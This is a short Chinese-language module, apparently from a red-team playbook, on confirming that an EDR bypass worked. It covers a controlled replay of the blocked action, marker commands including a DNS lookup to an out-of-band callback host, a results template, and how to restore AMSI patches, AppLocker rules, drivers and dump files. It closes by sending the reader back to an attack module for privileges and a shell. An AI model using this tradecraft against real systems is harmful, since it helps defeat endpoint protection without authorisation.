# Validation — 证明绕过成立

不要用“VT 0 detection”当成功。

---

## 1. 对照实验

```text
1. 记录阻断证据（事件、文件消失、进程退出码）
2. 只改当前层技术
3. 重放 **同一个** 被拦动作
4. 看动作是否完成
```

marker 例子：

```text
whoami > C:\Windows\Temp\rt-ok.txt
DNS: nslookup <unique>.oast.site
原 phishing/web payload 的 callback
```

---

## 2. 输出

```text
[EDR BYPASS]
Originating module:
Blocked action:
Layer:
Technique:
Before:
After: EXECUTABLE | STILL BLOCKED
Impact:
Restore:
Resume:
```

`STILL BLOCKED` → 换层，不要叠 5 个 bypass 当一个。

---

## 3. 恢复

```text
AMSI patch     进程退出即恢复
AppLocker XML  测完写回 backup
驱动           sc stop/delete
EDR-Freeze     等待超时或重启安全服务
dump 文件      删除
```

然后 **必须** 回到原 Attack 模块继续打权限/shell。本模块到此结束。
